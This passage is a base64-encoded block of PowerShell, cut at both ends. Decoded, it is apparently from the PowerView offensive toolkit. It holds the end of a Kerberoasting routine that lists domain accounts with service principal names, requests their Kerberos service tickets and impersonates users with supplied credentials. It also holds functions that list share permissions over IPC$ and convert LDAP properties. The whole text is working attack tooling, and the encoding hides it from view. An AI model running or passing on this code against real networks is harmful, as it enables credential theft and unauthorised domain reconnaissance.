lbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFVzZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdTUE4nID0gJFRydWUKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ3NhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLHNlcnZpY2VwcmluY2lwYWxuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0lkZW50aXR5J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CiAgICAgICAgR2V0LURvbWFpblVzZXIgQFVzZXJTZWFyY2hlckFyZ3VtZW50cyB8IFdoZXJlLU9iamVjdCB7JF8uc2FtYWNjb3VudG5hbWUgLW5lICdrcmJ0Z3QnfSB8IEdldC1Eb21haW5TUE5UaWNrZXQgLU91dHB1dEZvcm1hdCAkT3V0cHV0Rm9ybWF0CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtUGF0aEFjbCB7CjwjCi5TWU5PUFNJUwoKRW51bWVyYXRlcyB0aGUgQUNMIGZvciBhIGdpdmVuIGZpbGUgcGF0aC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogQWRkLVJlbW90ZUNvbm5lY3Rpb24sIFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uLCBDb252ZXJ0RnJvbS1TSUQgIAoKLkRFU0NSSVBUSU9OCgpFbnVtZXJhdGVzIHRoZSBBQ0wgZm9yIGEgc3BlY2lmaWVkIGZpbGUvZm9sZGVyIHBhdGgsIGFuZCB0cmFuc2xhdGVzCnRoZSBhY2Nlc3MgcnVsZXMgZm9yIGVhY2ggZW50cnkgaW50byByZWFkYWJsZSBmb3JtYXRzLiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsCkFkZC1SZW1vdGVDb25uZWN0aW9uL1JlbW92ZS1SZW1vdGVDb25uZWN0aW9uIGlzIHVzZWQgdG8gdGVtcG9yYXJpbHkgbWFwIHRoZSByZW1vdGUgc2hhcmUuCgouUEFSQU1FVEVSIFBhdGgKClNwZWNpZmllcyB0aGUgbG9jYWwgb3IgcmVtb3RlIHBhdGggdG8gZW51bWVyYXRlIHRoZSBBQ0xzIGZvci4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IHBhdGguCgouRVhBTVBMRQoKR2V0LVBhdGhBY2wgIlxcU0VSVkVSXFNoYXJlXCIKClJldHVybnMgQUNMcyBmb3IgdGhlIGdpdmVuIFVOQyBzaGFyZS4KCi5FWEFNUExFCgpnY2kgLlx0ZXN0LnR4dCB8IEdldC1QYXRoQWNsCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0nLCAkU2VjUGFzc3dvcmQpCkdldC1QYXRoQWNsIC1QYXRoICJcXFNFUlZFUlxTaGFyZVwiIC1DcmVkZW50aWFsICRDcmVkCgouSU5QVVRTCgpTdHJpbmcKCk9uZSBvZiBtb3JlIHBhdGhzIHRvIGVudW1lcmF0ZSBBQ0xzIGZvci4KCi5PVVRQVVRTCgpQb3dlclZpZXcuRmlsZUFDTAoKQSBjdXN0b20gb2JqZWN0IHdpdGggdGhlIGZ1bGwgcGF0aCBhbmQgYXNzb2NpYXRlZCBBQ0wgZW50cmllcy4KCi5MSU5LCgpodHRwczovL3N1cHBvcnQubWljcm9zb2Z0LmNvbS9lbi11cy9rYi8zMDUxNDQKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5GaWxlQUNMJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Z1bGxOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQYXRoLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CgogICAgICAgIGZ1bmN0aW9uIENvbnZlcnQtRmlsZVJpZ2h0IHsKICAgICAgICAgICAgIyBGcm9tIEFuc2dhciBXaWVjaGVycyBhdCBodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzI4MDI5ODcyL3JldHJpZXZpbmctc2VjdXJpdHktZGVzY3JpcHRvci1hbmQtZ2V0dGluZy1udW1iZXItZm9yLWZpbGVzeXN0ZW1yaWdodHMKICAgICAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0KICAgICAgICAgICAgUGFyYW0oCiAgICAgICAgICAgICAgICBbSW50XQogICAgICAgICAgICAgICAgJEZTUgogICAgICAgICAgICApCgogICAgICAgICAgICAkQWNjZXNzTWFzayA9IEB7CiAgICAgICAgICAgICAgICBbdWludDMyXScweDgwMDAwMDAwJyA9ICdHZW5lcmljUmVhZCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4NDAwMDAwMDAnID0gJ0dlbmVyaWNXcml0ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MjAwMDAwMDAnID0gJ0dlbmVyaWNFeGVjdXRlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgxMDAwMDAwMCcgPSAnR2VuZXJpY0FsbCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDIwMDAwMDAnID0gJ01heGltdW1BbGxvd2VkJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMTAwMDAwMCcgPSAnQWNjZXNzU3lzdGVtU2VjdXJpdHknCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMTAwMDAwJyA9ICdTeW5jaHJvbml6ZScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwODAwMDAnID0gJ1dyaXRlT3duZXInCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDQwMDAwJyA9ICdXcml0ZURBQycKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMjAwMDAnID0gJ1JlYWRDb250cm9sJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAxMDAwMCcgPSAnRGVsZXRlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDEwMCcgPSAnV3JpdGVBdHRyaWJ1dGVzJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDA4MCcgPSAnUmVhZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDQwJyA9ICdEZWxldGVDaGlsZCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMjAnID0gJ0V4ZWN1dGUvVHJhdmVyc2UnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDEwJyA9ICdXcml0ZUV4dGVuZGVkQXR0cmlidXRlcycKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDgnID0gJ1JlYWRFeHRlbmRlZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDA0JyA9ICdBcHBlbmREYXRhL0FkZFN1YmRpcmVjdG9yeScKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDInID0gJ1dyaXRlRGF0YS9BZGRGaWxlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMScgPSAnUmVhZERhdGEvTGlzdERpcmVjdG9yeScKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFNpbXBsZVBlcm1pc3Npb25zID0gQHsKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MWYwMWZmJyA9ICdGdWxsQ29udHJvbCcKICAgICAgICAgICAgICAgIFt1aW50MzJdJzB4MDMwMWJmJyA9ICdNb2RpZnknCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAyMDBhOScgPSAnUmVhZEFuZEV4ZWN1dGUnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAyMDE5ZicgPSAnUmVhZEFuZFdyaXRlJwogICAgICAgICAgICAgICAgW3VpbnQzMl0nMHgwMjAwODknID0gJ1JlYWQnCiAgICAgICAgICAgICAgICBbdWludDMyXScweDAwMDExNicgPSAnV3JpdGUnCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRQZXJtaXNzaW9ucyA9IEAoKQoKICAgICAgICAgICAgIyBnZXQgc2ltcGxlIHBlcm1pc3Npb24KICAgICAgICAgICAgJFBlcm1pc3Npb25zICs9ICRTaW1wbGVQZXJtaXNzaW9ucy5LZXlzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRGU1IgLWJhbmQgJF8pIC1lcSAkXykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTaW1wbGVQZXJtaXNzaW9uc1skX10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRlNSID0gJEZTUiAtYmFuZCAoLW5vdCAkXykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBnZXQgcmVtYWluaW5nIGV4dGVuZGVkIHBlcm1pc3Npb25zCiAgICAgICAgICAgICRQZXJtaXNzaW9ucyArPSAkQWNjZXNzTWFzay5LZXlzIHwgV2hlcmUtT2JqZWN0IHsgJEZTUiAtYmFuZCAkXyB9IHwgRm9yRWFjaC1PYmplY3QgeyAkQWNjZXNzTWFza1skX10gfQogICAgICAgICAgICAoJFBlcm1pc3Npb25zIHwgV2hlcmUtT2JqZWN0IHskX30pIC1qb2luICcsJwogICAgICAgIH0KCiAgICAgICAgJENvbnZlcnRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJE1hcHBlZENvbXB1dGVycyA9IEB7fQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRoKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoKCRUYXJnZXRQYXRoIC1NYXRjaCAnXFxcXC4qXFwuKicpIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSkgewogICAgICAgICAgICAgICAgICAgICRIb3N0Q29tcHV0ZXIgPSAoTmV3LU9iamVjdCBTeXN0ZW0uVXJpKCRUYXJnZXRQYXRoKSkuSG9zdAogICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBtYXAgSVBDJCB0byB0aGlzIGNvbXB1dGVyIGlmIGl0J3Mgbm90IGFscmVhZHkKICAgICAgICAgICAgICAgICAgICAgICAgQWRkLVJlbW90ZUNvbm5lY3Rpb24gLUNvbXB1dGVyTmFtZSAkSG9zdENvbXB1dGVyIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAgICAgICAgICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0gPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkQUNMID0gR2V0LUFjbCAtUGF0aCAkVGFyZ2V0UGF0aAoKICAgICAgICAgICAgICAgICRBQ0wuR2V0QWNjZXNzUnVsZXMoJFRydWUsICRUcnVlLCBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkU0lEID0gJF8uSWRlbnRpdHlSZWZlcmVuY2UuVmFsdWUKICAgICAgICAgICAgICAgICAgICAkTmFtZSA9IENvbnZlcnRGcm9tLVNJRCAtT2JqZWN0U0lEICRTSUQgQENvbnZlcnRBcmd1bWVudHMKCiAgICAgICAgICAgICAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1BhdGgnICRUYXJnZXRQYXRoCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdGaWxlU3lzdGVtUmlnaHRzJyAoQ29udmVydC1GaWxlUmlnaHQgLUZTUiAkXy5GaWxlU3lzdGVtUmlnaHRzLnZhbHVlX18pCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJZGVudGl0eVJlZmVyZW5jZScgJE5hbWUKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lkZW50aXR5U0lEJyAkU0lECiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdBY2Nlc3NDb250cm9sVHlwZScgJF8uQWNjZXNzQ29udHJvbFR5cGUKICAgICAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5GaWxlQUNMJykKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1QYXRoQWNsXSBlcnJvcjogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICAjIHJlbW92ZSB0aGUgSVBDJCBtYXBwaW5ncwogICAgICAgICRNYXBwZWRDb21wdXRlcnMuS2V5cyB8IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uCiAgICB9Cn0KCgpmdW5jdGlvbiBDb252ZXJ0LUxEQVBQcm9wZXJ0eSB7CjwjCi5TWU5PUFNJUwoKSGVscGVyIHRoYXQgY29udmVydHMgc3BlY2lmaWMgTERBUCBwcm9wZXJ0eSByZXN1bHQgZmllbGRzIGFuZCBvdXRwdXRzCmEgY3VzdG9tIHBzb2JqZWN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKQ29udmVydHMgYSBzZXQgb2YgcmF3IExEQVAgcHJvcGVydGllcyByZXN1bHRzIGZyb20gQURTSS9MREFQIHNlYXJjaGVzCmludG8gYSBwcm9wZXIgUFNPYmplY3QuIFVzZWQgYnkgc2V2ZXJhbCBvZiB0aGUgR2V0LURvbWFpbiogZnVuY3Rpb24uCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClByb3BlcnRpZXMgb2JqZWN0IHRvIGV4dHJhY3Qgb3V0IExEQVAgZmllbGRzIGZvciBkaXNwbGF5LgoKLk9VVFBVVFMKClN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QKCkEgY3VzdG9tIFBTT2JqZWN0IHdpdGggTERBUCBoYXNodGFibGUgcHJvcGVydGllcyB0cmFuc2xhdGVkLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgJFByb3BlcnRpZXMKICAgICkKCiAgICAkT2JqZWN0UHJvcGVydGllcyA9IEB7fQoKICAgICRQcm9wZXJ0aWVzLlByb3BlcnR5TmFtZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgaWYgKCRfIC1uZSAnYWRzcGF0aCcpIHsKICAgICAgICAgICAgaWYgKCgkXyAtZXEgJ29iamVjdHNpZCcpIC1vciAoJF8gLWVxICdzaWRoaXN0b3J5JykpIHsKICAgICAgICAgICAgICAgICMgY29udmVydCBhbGwgbGlzdGVkIHNpZHMgKGkuZS4gaWYgbXVsdGlwbGUgYXJlIGxpc3RlZCBpbiBzaWRIaXN0b3J5KQogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dIHwgRm9yRWFjaC1PYmplY3QgeyAoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkXywgMCkpLlZhbHVlIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnZ3JvdXB0eXBlJykgewogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dWzBdIC1hcyAkR3JvdXBUeXBlRW51bQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJF8gLWVxICdzYW1hY2NvdW50dHlwZScpIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wZXJ0aWVzWyRfXVswXSAtYXMgJFNhbUFjY291bnRUeXBlRW51bQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJF8gLWVxICdvYmplY3RndWlkJykgewogICAgICAgICAgICAgICAgIyBjb252ZXJ0IHRoZSBHVUlEIHRvIGEgc3RyaW5nCiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAoTmV3LU9iamVjdCBHdWlkICgsJFByb3BlcnRpZXNbJF9dWzBdKSkuR3VpZAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJF8gLWVxICd1c2VyYWNjb3VudGNvbnRyb2wnKSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX11bMF0gLWFzICRVQUNFbnVtCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ250c2VjdXJpdHlkZXNjcmlwdG9yJykgewogICAgICAgICAgICAgICAgIyAkT2JqZWN0UHJvcGVydGllc1skX10gPSBOZXctT2JqZWN0IFNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuUmF3U2VjdXJpdHlEZXNjcmlwdG9yIC1Bcmd1bWVudExpc3QgJFByb3BlcnRpZXNbJF9dWzBdLCAwCiAgICAgICAgICAgICAgICAkRGVzY3JpcHRvciA9IE5ldy1PYmplY3QgU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SYXdTZWN1cml0eURlc2NyaXB0b3IgLUFyZ3VtZW50TGlzdCAkUHJvcGVydGllc1skX11bMF0sIDAKICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5Pd25lcikgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWydPd25lciddID0gJERlc2NyaXB0b3IuT3duZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5Hcm91cCkgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWydHcm91cCddID0gJERlc2NyaXB0b3IuR3JvdXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5EaXNjcmV0aW9uYXJ5QWNsKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJ0Rpc2NyZXRpb25hcnlBY2wnXSA9ICREZXNjcmlwdG9yLkRpc2NyZXRpb25hcnlBY2wKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5TeXN0ZW1BY2wpIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1snU3lzdGVtQWNsJ10gPSAkRGVzY3JpcHRvci5TeXN0ZW1BY2wKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnYWNjb3VudGV4cGlyZXMnKSB7CiAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXNbJF9dWzBdIC1ndCBbRGF0ZVRpbWVdOjpNYXhWYWx1ZS5UaWNrcykgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICJORVZFUiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IFtkYXRldGltZV06OmZyb21maWxldGltZSgkUHJvcGVydGllc1skX11bMF0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICggKCRfIC1lcSAnbGFzdGxvZ29uJykgLW9yICgkXyAtZXEgJ2xhc3Rsb2dvbnRpbWVzdGFtcCcpIC1vciAoJF8gLWVxICdwd2RsYXN0c2V0JykgLW9yICgkXyAtZXEgJ2xhc3Rsb2dvZmYnKSAtb3IgKCRfIC1lcSAnYmFkUGFzc3dvcmRUaW1lJykgKSB7CiAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGltZXN0YW1wcwogICAgICAgICAgICAgICAgaWYgKCRQcm9wZXJ0aWVzWyRfXVswXSAtaXMgW1N5c3RlbS5NYXJzaGFsQnlSZWZPYmplY3RdKSB7CiAgICAgICAgICAgICAgICAgICAgIyBpZiB3ZSBoYXZlIGEgU3lzdGVtLl9fQ29tT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJFRlbXAgPSAkUHJvcGVydGllc1skX11bMF0KICAgICAgICAgICAgICAgICAgICBbSW50MzJdJEhpZ2ggPSAkVGVtcC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCdIaWdoUGFydCcsIFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpHZXRQcm9wZXJ0eSwgJE51bGwsICRUZW1wLCAkTnVsbCkKICAgICAgICAgICAgICAgICAgICBbSW50MzJdJExvdyAgPSAkVGVtcC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCdMb3dQYXJ0JywgIFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpHZXRQcm9wZXJ0eSwgJE51bGwsICRUZW1wLCAkTnVsbCkKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAoW2RhdGV0aW1lXTo6RnJvbUZpbGVUaW1lKFtJbnQ2NF0oIjB4ezA6eDh9ezE6eDh9IiAtZiAkSGlnaCwgJExvdykpKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgIyBvdGhlcndpc2UganVzdCBhIHN0cmluZwogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IChbZGF0ZXRpbWVdOjpGcm9tRmlsZVRpbWUoKCRQcm9wZXJ0aWVzWyRfXVswXSkpKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJFByb3BlcnRpZXNbJF9dWzBdIC1pcyBbU3lzdGVtLk1hcnNoYWxCeVJlZk9iamVjdF0pIHsKICAgICAgICAgICAgICAgICMgdHJ5IHRvIGNvbnZlcnQgbWlzYyBjb20gb2JqZWN0cwogICAgICAgICAgICAgICAgJFByb3AgPSAkUHJvcGVydGllc1skX10KICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFRlbXAgPSAkUHJvcFskX11bMF0KICAgICAgICAgICAgICAgICAgICBbSW50MzJdJEhpZ2ggPSAkVGVtcC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCdIaWdoUGFydCcsIFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpHZXRQcm9wZXJ0eSwgJE51bGwsICRUZW1wLCAkTnVsbCkKICAgICAgICAgICAgIC